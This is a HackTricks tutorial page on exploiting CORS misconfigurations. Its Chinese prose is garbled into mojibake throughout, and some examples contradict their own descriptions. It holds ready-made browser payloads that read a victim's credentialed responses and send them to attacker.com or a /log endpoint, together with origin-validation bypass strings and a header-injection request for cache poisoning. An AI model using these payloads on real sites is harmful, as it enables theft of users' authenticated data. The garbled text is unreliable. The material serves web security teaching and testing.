# CORS - Misconfigurations & Bypass

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## ä»€ä¹ˆæ˜¯ CORSï¼Ÿ

è·¨æºèµ„æºå…±äº« (CORS) æ ‡å‡† **ä½¿æœåŠ¡å™¨èƒ½å¤Ÿå®šä¹‰è°å¯ä»¥è®¿é—®å…¶èµ„äº§** å’Œ **å“ªäº› HTTP è¯·æ±‚æ–¹æ³•è¢«å…è®¸** æ¥è‡ªå¤–éƒ¨æ¥æºã€‚

**åŒæº** ç­–ç•¥è¦æ±‚ **è¯·æ±‚** èµ„æºçš„æœåŠ¡å™¨å’Œæ‰˜ç®¡ **èµ„æº** çš„æœåŠ¡å™¨å…±äº«ç›¸åŒçš„åè®®ï¼ˆä¾‹å¦‚ï¼Œ`http://`ï¼‰ã€åŸŸåï¼ˆä¾‹å¦‚ï¼Œ`internal-web.com`ï¼‰å’Œ **ç«¯å£**ï¼ˆä¾‹å¦‚ï¼Œ80ï¼‰ã€‚åœ¨æ­¤ç­–ç•¥ä¸‹ï¼Œä»…å…è®¸æ¥è‡ªåŒä¸€åŸŸå’Œç«¯å£çš„ç½‘é¡µè®¿é—®èµ„æºã€‚

åœ¨ `http://normal-website.com/example/example.html` çš„ä¸Šä¸‹æ–‡ä¸­ï¼ŒåŒæºç­–ç•¥çš„åº”ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š

| è®¿é—®çš„ URL                               | æ˜¯å¦å…è®¸è®¿é—®ï¼Ÿ                       |
| ----------------------------------------- | ------------------------------------- |
| `http://normal-website.com/example/`      | æ˜¯ï¼šç›¸åŒçš„åè®®ã€åŸŸåå’Œç«¯å£            |
| `http://normal-website.com/example2/`     | æ˜¯ï¼šç›¸åŒçš„åè®®ã€åŸŸåå’Œç«¯å£            |
| `https://normal-website.com/example/`     | å¦ï¼šä¸åŒçš„åè®®å’Œç«¯å£                  |
| `http://en.normal-website.com/example/`   | å¦ï¼šä¸åŒçš„åŸŸå                        |
| `http://www.normal-website.com/example/`  | å¦ï¼šä¸åŒçš„åŸŸå                        |
| `http://normal-website.com:8080/example/` | å¦ï¼šä¸åŒçš„ç«¯å£\*                     |

\*Internet Explorer åœ¨æ‰§è¡ŒåŒæºç­–ç•¥æ—¶å¿½ç•¥ç«¯å£å·ï¼Œå› æ­¤å…è®¸æ­¤è®¿é—®ã€‚

### `Access-Control-Allow-Origin` å¤´

æ­¤å¤´å¯ä»¥å…è®¸ **å¤šä¸ªæº**ã€**`null`** å€¼æˆ–é€šé…ç¬¦ **`*`**ã€‚ç„¶è€Œï¼Œ**æ²¡æœ‰æµè§ˆå™¨æ”¯æŒå¤šä¸ªæº**ï¼Œå¹¶ä¸”é€šé…ç¬¦ `*` çš„ä½¿ç”¨å—åˆ° **é™åˆ¶**ã€‚ï¼ˆé€šé…ç¬¦å¿…é¡»å•ç‹¬ä½¿ç”¨ï¼Œä¸”ä¸ `Access-Control-Allow-Credentials: true` ä¸€èµ·ä½¿ç”¨æ˜¯ä¸å…è®¸çš„ã€‚ï¼‰

æ­¤å¤´æ˜¯ **ç”±æœåŠ¡å™¨å‘å‡º** çš„ï¼Œä»¥å“åº”ç”±ç½‘ç«™å‘èµ·çš„è·¨åŸŸèµ„æºè¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æ·»åŠ  `Origin` å¤´ã€‚

### `Access-Control-Allow-Credentials` å¤´

**é»˜è®¤æƒ…å†µä¸‹**ï¼Œè·¨æºè¯·æ±‚æ˜¯åœ¨æ²¡æœ‰å‡­æ®ï¼ˆå¦‚ cookies æˆ– Authorization å¤´ï¼‰çš„æƒ…å†µä¸‹è¿›è¡Œçš„ã€‚ç„¶è€Œï¼Œè·¨åŸŸæœåŠ¡å™¨å¯ä»¥é€šè¿‡å°† `Access-Control-Allow-Credentials` å¤´è®¾ç½®ä¸º **`true`** æ¥å…è®¸åœ¨å‘é€å‡­æ®æ—¶è¯»å–å“åº”ã€‚

å¦‚æœè®¾ç½®ä¸º `true`ï¼Œæµè§ˆå™¨å°†ä¼ è¾“å‡­æ®ï¼ˆcookiesã€æˆæƒå¤´æˆ– TLS å®¢æˆ·ç«¯è¯ä¹¦ï¼‰ã€‚
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF é¢„æ£€è¯·æ±‚

### ç†è§£è·¨åŸŸé€šä¿¡ä¸­çš„é¢„æ£€è¯·æ±‚

åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å‘èµ·è·¨åŸŸè¯·æ±‚æ—¶ï¼Œä¾‹å¦‚ä½¿ç”¨ **éæ ‡å‡† HTTP æ–¹æ³•**ï¼ˆé™¤äº† HEADã€GETã€POST ä»¥å¤–çš„ä»»ä½•æ–¹æ³•ï¼‰ã€å¼•å…¥æ–°çš„ **å¤´éƒ¨**ï¼Œæˆ–ä½¿ç”¨ç‰¹æ®Šçš„ **Content-Type å¤´éƒ¨å€¼**ï¼Œå¯èƒ½éœ€è¦è¿›è¡Œé¢„æ£€è¯·æ±‚ã€‚è¿™ä¸ªåˆæ­¥è¯·æ±‚åˆ©ç”¨ **`OPTIONS`** æ–¹æ³•ï¼Œæ—¨åœ¨é€šçŸ¥æœåŠ¡å™¨å³å°†åˆ°æ¥çš„è·¨æºè¯·æ±‚çš„æ„å›¾ï¼ŒåŒ…æ‹¬å®ƒæ‰“ç®—ä½¿ç”¨çš„ HTTP æ–¹æ³•å’Œå¤´éƒ¨ã€‚

**è·¨æºèµ„æºå…±äº« (CORS)** åè®®è¦æ±‚è¿›è¡Œæ­¤é¢„æ£€æ£€æŸ¥ï¼Œä»¥é€šè¿‡éªŒè¯å…è®¸çš„æ–¹æ³•ã€å¤´éƒ¨å’Œæ¥æºçš„å¯ä¿¡åº¦æ¥ç¡®å®šè¯·æ±‚çš„è·¨æºæ“ä½œçš„å¯è¡Œæ€§ã€‚æœ‰å…³å“ªäº›æ¡ä»¶å¯ä»¥ç»•è¿‡é¢„æ£€è¯·æ±‚çš„è¯¦ç»†ç†è§£ï¼Œè¯·å‚è€ƒ [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) æä¾›çš„ç»¼åˆæŒ‡å—ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ**ç¼ºå°‘é¢„æ£€è¯·æ±‚å¹¶ä¸æ„å‘³ç€å“åº”ä¸éœ€è¦æºå¸¦æˆæƒå¤´éƒ¨**ã€‚æ²¡æœ‰è¿™äº›å¤´éƒ¨ï¼Œæµè§ˆå™¨å°†æ— æ³•å¤„ç†æ¥è‡ªè·¨æºè¯·æ±‚çš„å“åº”ã€‚

è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œå±•ç¤ºäº†ä¸€ä¸ªæ—¨åœ¨ä½¿ç”¨ `PUT` æ–¹æ³•å’Œåä¸º `Special-Request-Header` çš„è‡ªå®šä¹‰å¤´éƒ¨çš„é¢„æ£€è¯·æ±‚ï¼š
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
ä½œä¸ºå“åº”ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›æŒ‡ç¤ºæ¥å—çš„æ–¹æ³•ã€å…è®¸çš„æ¥æºå’Œå…¶ä»–CORSæ”¿ç­–ç»†èŠ‚çš„å¤´éƒ¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: æ­¤å¤´éƒ¨æŒ‡å®šåœ¨å®é™…è¯·æ±‚ä¸­å¯ä»¥ä½¿ç”¨å“ªäº›å¤´éƒ¨ã€‚å®ƒç”±æœåŠ¡å™¨è®¾ç½®ï¼Œä»¥æŒ‡ç¤ºå®¢æˆ·ç«¯è¯·æ±‚ä¸­å…è®¸çš„å¤´éƒ¨ã€‚
* **`Access-Control-Expose-Headers`**: é€šè¿‡æ­¤å¤´éƒ¨ï¼ŒæœåŠ¡å™¨é€šçŸ¥å®¢æˆ·ç«¯å“ªäº›å¤´éƒ¨å¯ä»¥ä½œä¸ºå“åº”çš„ä¸€éƒ¨åˆ†è¢«æš´éœ²ï¼Œé™¤äº†ç®€å•çš„å“åº”å¤´éƒ¨ã€‚
* **`Access-Control-Max-Age`**: æ­¤å¤´éƒ¨æŒ‡ç¤ºé¢„æ£€è¯·æ±‚çš„ç»“æœå¯ä»¥ç¼“å­˜å¤šé•¿æ—¶é—´ã€‚æœåŠ¡å™¨è®¾ç½®é¢„æ£€è¯·æ±‚è¿”å›çš„ä¿¡æ¯å¯ä»¥é‡ç”¨çš„æœ€å¤§æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚
* **`Access-Control-Request-Headers`**: åœ¨é¢„æ£€è¯·æ±‚ä¸­ä½¿ç”¨ï¼Œæ­¤å¤´éƒ¨ç”±å®¢æˆ·ç«¯è®¾ç½®ï¼Œä»¥é€šçŸ¥æœåŠ¡å™¨å®¢æˆ·ç«¯å¸Œæœ›åœ¨å®é™…è¯·æ±‚ä¸­ä½¿ç”¨å“ªäº›HTTPå¤´éƒ¨ã€‚
* **`Access-Control-Request-Method`**: æ­¤å¤´éƒ¨ä¹Ÿåœ¨é¢„æ£€è¯·æ±‚ä¸­ä½¿ç”¨ï¼Œç”±å®¢æˆ·ç«¯è®¾ç½®ï¼Œä»¥æŒ‡ç¤ºåœ¨å®é™…è¯·æ±‚ä¸­å°†ä½¿ç”¨å“ªä¸ªHTTPæ–¹æ³•ã€‚
* **`Origin`**: æ­¤å¤´éƒ¨ç”±æµè§ˆå™¨è‡ªåŠ¨è®¾ç½®ï¼ŒæŒ‡ç¤ºè·¨æºè¯·æ±‚çš„æ¥æºã€‚æœåŠ¡å™¨ä½¿ç”¨å®ƒæ¥è¯„ä¼°æ ¹æ®CORSç­–ç•¥æ˜¯å¦åº”å…è®¸æˆ–æ‹’ç»ä¼ å…¥è¯·æ±‚ã€‚

è¯·æ³¨æ„ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼ˆå–å†³äºå†…å®¹ç±»å‹å’Œè®¾ç½®çš„å¤´éƒ¨ï¼‰åœ¨**GET/POSTè¯·æ±‚ä¸­ä¸ä¼šå‘é€é¢„æ£€è¯·æ±‚**ï¼ˆè¯·æ±‚æ˜¯**ç›´æ¥**å‘é€çš„ï¼‰ï¼Œä½†å¦‚æœæ‚¨æƒ³è®¿é—®**å“åº”çš„å¤´éƒ¨/ä¸»ä½“**ï¼Œå®ƒå¿…é¡»åŒ…å«ä¸€ä¸ªå…è®¸çš„ _Access-Control-Allow-Origin_ å¤´éƒ¨ã€‚\
**å› æ­¤ï¼ŒCORSå¹¶ä¸èƒ½é˜²æ­¢CSRFï¼ˆä½†å®ƒå¯èƒ½æœ‰å¸®åŠ©ï¼‰ã€‚**

### **æœ¬åœ°ç½‘ç»œè¯·æ±‚é¢„æ£€è¯·æ±‚**

1. **`Access-Control-Request-Local-Network`**: æ­¤å¤´éƒ¨åŒ…å«åœ¨å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸­ï¼Œä»¥è¡¨æ˜è¯¥è¯·æ±‚æ˜¯é’ˆå¯¹æœ¬åœ°ç½‘ç»œèµ„æºçš„ã€‚å®ƒä½œä¸ºä¸€ä¸ªæ ‡è®°ï¼Œé€šçŸ¥æœåŠ¡å™¨è¯·æ±‚æºè‡ªæœ¬åœ°ç½‘ç»œå†…ã€‚
2. **`Access-Control-Allow-Local-Network`**: ä½œä¸ºå“åº”ï¼ŒæœåŠ¡å™¨åˆ©ç”¨æ­¤å¤´éƒ¨æ¥ä¼ è¾¾è¯·æ±‚çš„èµ„æºè¢«å…è®¸ä¸æœ¬åœ°ç½‘ç»œå¤–çš„å®ä½“å…±äº«ã€‚å®ƒä½œä¸ºè·¨è¶Šä¸åŒç½‘ç»œè¾¹ç•Œå…±äº«èµ„æºçš„ç»¿ç¯ï¼Œç¡®ä¿åœ¨ç»´æŠ¤å®‰å…¨åè®®çš„åŒæ—¶å®ç°å—æ§è®¿é—®ã€‚

ä¸€ä¸ª**æœ‰æ•ˆçš„å“åº”å…è®¸æœ¬åœ°ç½‘ç»œè¯·æ±‚**è¿˜éœ€è¦åœ¨å“åº”ä¸­åŒ…å«å¤´éƒ¨ `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œlinux **0.0.0.0** IP å¯ä»¥ç”¨æ¥ **ç»•è¿‡** è¿™äº›è¦æ±‚ä»¥è®¿é—® localhostï¼Œå› ä¸ºè¯¥ IP åœ°å€ä¸è¢«è§†ä¸ºâ€œæœ¬åœ°â€ã€‚

å¦‚æœä½¿ç”¨ **æœ¬åœ°ç«¯ç‚¹çš„å…¬å…± IP åœ°å€**ï¼ˆä¾‹å¦‚è·¯ç”±å™¨çš„å…¬å…± IPï¼‰ï¼Œä¹Ÿå¯ä»¥ **ç»•è¿‡æœ¬åœ°ç½‘ç»œè¦æ±‚**ã€‚å› ä¸ºåœ¨å¤šç§æƒ…å†µä¸‹ï¼Œå³ä½¿æ­£åœ¨è®¿é—® **å…¬å…± IP**ï¼Œå¦‚æœå®ƒæ˜¯ **æ¥è‡ªæœ¬åœ°ç½‘ç»œ**ï¼Œä¹Ÿä¼šè¢«æˆäºˆè®¿é—®æƒé™ã€‚
{% endhint %}

### é€šé…ç¬¦

è¯·æ³¨æ„ï¼Œå³ä½¿ä»¥ä¸‹é…ç½®çœ‹èµ·æ¥éå¸¸å®½æ¾ï¼š
```bash
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
è¿™åœ¨æµè§ˆå™¨ä¸­æ˜¯ä¸å…è®¸çš„ï¼Œå› æ­¤å‡­æ®ä¸ä¼šéšè¯·æ±‚å‘é€ã€‚

## å¯åˆ©ç”¨çš„é”™è¯¯é…ç½®

å·²è§‚å¯Ÿåˆ°å°† `Access-Control-Allow-Credentials` è®¾ç½®ä¸º **`true`** æ˜¯å¤§å¤šæ•° **çœŸå®æ”»å‡»** çš„å‰ææ¡ä»¶ã€‚æ­¤è®¾ç½®å…è®¸æµè§ˆå™¨å‘é€å‡­æ®å¹¶è¯»å–å“åº”ï¼Œä»è€Œå¢å¼ºæ”»å‡»çš„æœ‰æ•ˆæ€§ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªï¼Œåˆ©ç”¨ç”¨æˆ·çš„ cookies çš„å¥½å¤„å°±ä¼šå‡å°‘ï¼Œå› ä¸ºåˆ©ç”¨ç”¨æˆ·çš„ cookies å˜å¾—ä¸å¯è¡Œã€‚

### ä¾‹å¤–ï¼šåˆ©ç”¨ç½‘ç»œä½ç½®ä½œä¸ºè®¤è¯

å­˜åœ¨ä¸€ä¸ªä¾‹å¤–æƒ…å†µï¼Œå³å—å®³è€…çš„ç½‘ç»œä½ç½®ä½œä¸ºä¸€ç§è®¤è¯å½¢å¼ã€‚è¿™å…è®¸å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºä»£ç†ï¼Œç»•è¿‡åŸºäº IP çš„è®¤è¯ä»¥è®¿é—®å†…ç½‘åº”ç”¨ç¨‹åºã€‚è¿™ç§æ–¹æ³•åœ¨å½±å“ä¸Šä¸ DNS é‡æ–°ç»‘å®šç›¸ä¼¼ï¼Œä½†æ›´å®¹æ˜“åˆ©ç”¨ã€‚

### `Origin` åœ¨ `Access-Control-Allow-Origin` ä¸­çš„åå°„

åœ¨ç°å®åœºæ™¯ä¸­ï¼Œ`Origin` å¤´çš„å€¼åå°„åœ¨ `Access-Control-Allow-Origin` ä¸­åœ¨ç†è®ºä¸Šæ˜¯ä¸å¤ªå¯èƒ½çš„ï¼Œå› ä¸ºå¯¹è¿™äº›å¤´çš„ç»„åˆæœ‰é™åˆ¶ã€‚ç„¶è€Œï¼Œå¯»æ±‚ä¸ºå¤šä¸ª URL å¯ç”¨ CORS çš„å¼€å‘è€…å¯èƒ½ä¼šé€šè¿‡å¤åˆ¶ `Origin` å¤´çš„å€¼åŠ¨æ€ç”Ÿæˆ `Access-Control-Allow-Origin` å¤´ã€‚è¿™ç§æ–¹æ³•å¯èƒ½å¼•å…¥æ¼æ´ï¼Œç‰¹åˆ«æ˜¯å½“æ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ªçœ‹ä¼¼åˆæ³•çš„åŸŸåæ—¶ï¼Œä»è€Œæ¬ºéª—éªŒè¯é€»è¾‘ã€‚
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### åˆ©ç”¨ `null` æº

`null` æºåœ¨é‡å®šå‘æˆ–æœ¬åœ° HTML æ–‡ä»¶ç­‰æƒ…å†µä¸­æŒ‡å®šï¼Œå…·æœ‰ç‹¬ç‰¹çš„åœ°ä½ã€‚ä¸€äº›åº”ç”¨ç¨‹åºå°†æ­¤æºåˆ—å…¥ç™½åå•ä»¥ä¿ƒè¿›æœ¬åœ°å¼€å‘ï¼Œæ— æ„ä¸­å…è®¸ä»»ä½•ç½‘ç«™é€šè¿‡æ²™ç›’ iframe æ¨¡ä»¿ `null` æºï¼Œä»è€Œç»•è¿‡ CORS é™åˆ¶ã€‚
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡æŠ€æœ¯

å½“é‡åˆ°åŸŸåç™½åå•æ—¶ï¼Œæµ‹è¯•ç»•è¿‡æœºä¼šè‡³å…³é‡è¦ï¼Œä¾‹å¦‚å°†æ”»å‡»è€…çš„åŸŸåé™„åŠ åˆ°ç™½åå•åŸŸåæˆ–åˆ©ç”¨å­åŸŸåæ¥ç®¡æ¼æ´ã€‚æ­¤å¤–ï¼Œç”¨äºåŸŸåéªŒè¯çš„æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½ä¼šå¿½è§†åŸŸåå‘½åè§„åˆ™ä¸­çš„ç»†å¾®å·®åˆ«ï¼Œä»è€Œæä¾›è¿›ä¸€æ­¥çš„ç»•è¿‡æœºä¼šã€‚

### é«˜çº§æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡

æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼é€šå¸¸é›†ä¸­äºå­—æ¯æ•°å­—ã€ç‚¹ (.) å’Œè¿å­—ç¬¦ (-) å­—ç¬¦ï¼Œå¿½ç•¥å…¶ä»–å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æµè§ˆå™¨å’Œæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä»¥ä¸åŒæ–¹å¼è§£é‡Šçš„å­—ç¬¦çš„åŸŸåï¼Œå¯ä»¥ç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚Safariã€Chrome å’Œ Firefox å¯¹å­åŸŸåä¸­ä¸‹åˆ’çº¿å­—ç¬¦çš„å¤„ç†è¯´æ˜äº†å¦‚ä½•åˆ©ç”¨è¿™äº›å·®å¼‚æ¥è§„é¿åŸŸåéªŒè¯é€»è¾‘ã€‚

**æœ‰å…³æ­¤ç»•è¿‡æ£€æŸ¥çš„æ›´å¤šä¿¡æ¯å’Œè®¾ç½®ï¼š** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **å’Œ** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### ä»å­åŸŸåä¸­çš„ XSS

å¼€å‘äººå‘˜é€šå¸¸å®æ–½é˜²å¾¡æœºåˆ¶ï¼Œä»¥é€šè¿‡ç™½åå•å…è®¸è¯·æ±‚ä¿¡æ¯çš„åŸŸåæ¥ä¿æŠ¤å…å— CORS åˆ©ç”¨ã€‚å°½ç®¡é‡‡å–äº†è¿™äº›é¢„é˜²æªæ–½ï¼Œç³»ç»Ÿçš„å®‰å…¨æ€§å¹¶éä¸‡æ— ä¸€å¤±ã€‚åœ¨ç™½åå•åŸŸåä¸­ï¼Œå³ä½¿å­˜åœ¨ä¸€ä¸ªè„†å¼±çš„å­åŸŸåï¼Œä¹Ÿå¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´ï¼ˆå¦‚ XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ï¼‰æ‰“å¼€ CORS åˆ©ç”¨çš„å¤§é—¨ã€‚

ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸€ä¸ªåœºæ™¯ï¼Œå…¶ä¸­åŸŸå `requester.com` è¢«åˆ—å…¥ç™½åå•ä»¥è®¿é—®å¦ä¸€ä¸ªåŸŸå `provider.com` çš„èµ„æºã€‚æœåŠ¡å™¨ç«¯é…ç½®å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
åœ¨æ­¤è®¾ç½®ä¸­ï¼Œ`requester.com` çš„æ‰€æœ‰å­åŸŸéƒ½è¢«å…è®¸è®¿é—®ã€‚ç„¶è€Œï¼Œå¦‚æœä¸€ä¸ªå­åŸŸï¼Œä¾‹å¦‚ `sub.requester.com`ï¼Œå­˜åœ¨ XSS æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¼±ç‚¹ã€‚ä¾‹å¦‚ï¼Œæ‹¥æœ‰ `sub.requester.com` è®¿é—®æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XSS æ¼æ´ç»•è¿‡ CORS ç­–ç•¥ï¼Œæ¶æ„è®¿é—® `provider.com` ä¸Šçš„èµ„æºã€‚

### **ç‰¹æ®Šå­—ç¬¦**

PortSwigger çš„ [URL éªŒè¯ç»•è¿‡å¤‡å¿˜å•](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet) å‘ç°æŸäº›æµè§ˆå™¨æ”¯æŒåŸŸåä¸­çš„å¥‡æ€ªå­—ç¬¦ã€‚

Chrome å’Œ Firefox æ”¯æŒä¸‹åˆ’çº¿ `_`ï¼Œå¯ä»¥ç»•è¿‡ç”¨äºéªŒè¯ `Origin` å¤´çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š
```
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://target.application_.arbitrary.com
```

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://target.application_.arbitrary.com
Access-Control-Allow-Credentials: true
```
Safari åœ¨æ¥å—åŸŸåä¸­çš„ç‰¹æ®Šå­—ç¬¦æ–¹é¢ç”šè‡³æ›´åŠ å®½æ¾ï¼š
```
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://target.application}.arbitrary.com
```

```
HTTP/2 200 OK
Cookie: <session_cookie>
Access-Control-Allow-Origin: https://target.application}.arbitrary.com
Access-Control-Allow-Credentials: true
```
### **å…¶ä»–æœ‰è¶£çš„ URL æŠ€å·§**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

### **æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­æ¯’**

[**æ¥è‡ªè¿™é¡¹ç ”ç©¶**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

é€šè¿‡ HTTP å¤´æ³¨å…¥åˆ©ç”¨æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­æ¯’ï¼Œå¯èƒ½ä¼šå¼•å‘å­˜å‚¨çš„è·¨ç«™è„šæœ¬ (XSS) æ¼æ´ã€‚å½“åº”ç”¨ç¨‹åºæœªèƒ½æ¸…ç† `Origin` å¤´ä¸­çš„éæ³•å­—ç¬¦æ—¶ï¼Œè¿™ç§æƒ…å†µå°±ä¼šå‘ç”Ÿï¼Œç‰¹åˆ«æ˜¯å¯¹ Internet Explorer å’Œ Edge ç”¨æˆ·è€Œè¨€ã€‚è¿™äº›æµè§ˆå™¨å°† (0x0d) è§†ä¸ºåˆæ³•çš„ HTTP å¤´ç»ˆæ­¢ç¬¦ï¼Œä»è€Œå¯¼è‡´ HTTP å¤´æ³¨å…¥æ¼æ´ã€‚

è€ƒè™‘ä»¥ä¸‹è¯·æ±‚ï¼Œå…¶ä¸­ `Origin` å¤´è¢«æ“çºµï¼š
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer å’Œ Edge å°†å“åº”è§£é‡Šä¸ºï¼š
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
è™½ç„¶é€šè¿‡ä½¿ç½‘ç»œæµè§ˆå™¨å‘é€æ ¼å¼é”™è¯¯çš„å¤´éƒ¨ç›´æ¥åˆ©ç”¨æ­¤æ¼æ´å¹¶ä¸å¯è¡Œï¼Œä½†å¯ä»¥ä½¿ç”¨åƒ Burp Suite è¿™æ ·çš„å·¥å…·æ‰‹åŠ¨ç”Ÿæˆä¸€ä¸ªç²¾å¿ƒåˆ¶ä½œçš„è¯·æ±‚ã€‚æ­¤æ–¹æ³•å¯èƒ½å¯¼è‡´æœåŠ¡å™¨ç«¯ç¼“å­˜ä¿å­˜å“åº”ï¼Œå¹¶æ— æ„ä¸­å°†å…¶æä¾›ç»™å…¶ä»–äººã€‚ç²¾å¿ƒåˆ¶ä½œçš„æœ‰æ•ˆè½½è·æ—¨åœ¨å°†é¡µé¢çš„å­—ç¬¦é›†æ›´æ”¹ä¸º UTF-7ï¼Œè¿™æ˜¯ä¸€ç§å­—ç¬¦ç¼–ç ï¼Œé€šå¸¸ä¸ XSS æ¼æ´ç›¸å…³ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿä»¥æŸç§æ–¹å¼ç¼–ç å­—ç¬¦ï¼Œä½¿å…¶åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­å¯ä»¥ä½œä¸ºè„šæœ¬æ‰§è¡Œã€‚

æœ‰å…³å­˜å‚¨å‹ XSS æ¼æ´çš„è¿›ä¸€æ­¥é˜…è¯»ï¼Œè¯·å‚è§ [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored)ã€‚

